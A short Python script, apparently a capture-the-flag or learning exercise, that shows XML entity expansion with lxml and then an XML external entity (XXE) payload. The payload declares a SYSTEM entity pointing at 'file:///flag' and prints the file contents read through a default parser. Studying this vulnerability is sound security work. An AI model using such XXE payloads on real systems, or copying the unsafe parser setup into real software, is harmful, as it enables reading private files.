from lxml import etree

xml = b'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY arg1 "a1"> <!ENTITY arg2 "a2"> ]><tags><tag1>&arg1;</tag1><tag2>&arg2;</tag2><tag3>arg3</tag3></tags>'

parser = etree.XMLParser()
root = etree.fromstring(xml, parser=parser)

one = root.xpath("/tags/tag1")[0].text
two = root.xpath("/tags/tag2")[0].text
thr = root.xpath("/tags/tag3")[0].text

print(one, two, thr)




xml_vuln = b'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY leak SYSTEM "file:///flag"> ]><tags><tag1>&leak;</tag1></tags>'
root2 = etree.fromstring(xml_vuln, parser=parser)
leak = root2.xpath("/tags/tag1")[0].text
print(leak)
